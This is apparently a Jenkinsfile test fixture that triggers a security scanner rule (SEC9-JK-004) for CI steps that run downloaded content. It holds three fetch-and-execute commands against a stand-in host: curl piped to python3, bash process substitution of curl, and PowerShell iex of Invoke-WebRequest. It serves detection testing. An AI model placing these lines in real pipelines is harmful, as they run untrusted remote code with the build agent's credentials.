// Triggers: SEC9-JK-004 — Jenkinsfile shell sink runs downloaded content
//
// Three walker-only shapes the line-scoped SEC9-JK-001 regex cannot
// reach:
//   1. ``curl ... | python3``       (non-shell interpreter pipe)
//   2. ``bash <(curl ...)``         (process substitution; no ``|``)
//   3. ``iex(Invoke-WebRequest ...)`` (PowerShell remote execution)
//
// All three execute attacker-chosen bytes from a remote endpoint
// inside the Jenkins agent, with the agent's bound credentials.
pipeline {
    agent any
    stages {
        stage('Bootstrap python deps') {
            steps {
                sh 'curl -fsSL https://get.example.com/setup.py | python3'
            }
        }
        stage('Bootstrap shell tools') {
            steps {
                sh 'bash <(curl -fsSL https://get.example.com/install.sh)'
            }
        }
        stage('Bootstrap Windows tools') {
            agent { label 'windows' }
            steps {
                powershell 'iex(Invoke-WebRequest -Uri https://get.example.com/setup.ps1).Content'
            }
        }
    }
}
